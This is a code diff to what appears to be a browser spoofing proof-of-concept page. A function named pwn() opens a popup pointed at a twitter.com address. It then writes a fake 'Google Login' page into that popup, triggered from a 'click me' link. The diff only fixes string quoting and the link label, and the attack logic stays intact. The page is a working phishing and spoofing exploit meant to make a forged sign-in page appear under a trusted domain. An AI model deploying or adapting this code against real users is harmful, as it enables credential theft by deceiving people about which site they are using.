@@ -10,7 +10,8 @@
     function pwn() {
         v = setInterval(`x=window.open('https://www.twitter.com:1234','test', 'width=400 height=300')`);
         i = setInterval(`
-            x.document.write("<html>
+            x.document.write(\`
+                <html>
                 <head><title>Google Login</title></head>
                 <body style="margin:0; padding:0; font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif; overflow:hidden;">
                     
@@ -46,12 +47,13 @@
                         </div>
                     </div>
                 </body>
-                </html>");
+                </html>
+            \`);
             clearInterval(v);
             clearInterval(i);
             `, 3);
     }
 </script>
-<li onclick="pwn()">step1: click me</li>
+<li onclick="pwn()">click me</li>
 </body>
 </html>
